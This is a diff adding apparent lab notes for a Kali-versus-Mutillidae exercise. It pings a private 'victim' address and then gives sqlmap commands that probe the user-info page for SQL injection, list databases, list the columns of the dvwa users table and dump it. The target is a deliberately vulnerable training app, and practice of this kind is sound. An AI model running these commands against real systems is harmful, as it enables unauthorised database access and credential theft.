@@ -1,0 +1,7 @@
+ping 192.168.0.103 (run this in kali machine to verify the victim machine is running...)
+sqlmap -u "http://192.168.0.103/mutillidae/index.php?page=user-info.php&username=Assignment&password=Assignment&user-info-php-submit-button=View+Account+Details"
+sqlmap -u "http://192.168.0.103/mutillidae/index.php?page=user-info.php&username=Assignment&password=Assignment&user-info-php-submit-button=View+Account+Details" --dbs
+sqlmap -u "http://192.168.0.103/mutillidae/index.php?page=user-info.php&username=test&password=test&user-info-php-submit-button=View+Account+Details" -D dvwa -T users --columns
+sqlmap -u "http://192.168.0.103/mutillidae/index.php?page=user-info.php&username=test&password=test&user-info-php-submit-button=View+Account+Details" -D dvwa -T users --dump   
+
+
